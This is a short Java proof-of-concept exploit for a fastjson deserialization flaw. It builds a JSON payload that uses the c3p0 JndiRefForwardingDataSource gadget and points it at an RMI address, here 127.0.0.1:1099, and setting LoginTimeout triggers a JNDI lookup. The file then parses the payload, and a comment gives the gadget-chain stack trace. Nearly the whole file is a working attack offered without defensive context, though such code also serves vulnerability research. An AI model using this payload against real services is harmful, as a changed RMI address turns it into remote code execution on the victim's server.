package JNDIPoC;

import com.alibaba.fastjson.JSON;

public class JndiRefForwardingDataSourceEXP {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] JndiRefForwardingDataSourceEXP EXP");
        String payload = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\"," +
                "\"jndiName\":\"rmi://127.0.0.1:1099/wyt7dd\",\"LoginTimeout\":\"1\"}";
        /*
dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
main:10, JndiRefForwardingDataSourceEXP (JNDIPoC)
         */
        JSON.parse(payload);
    }
}
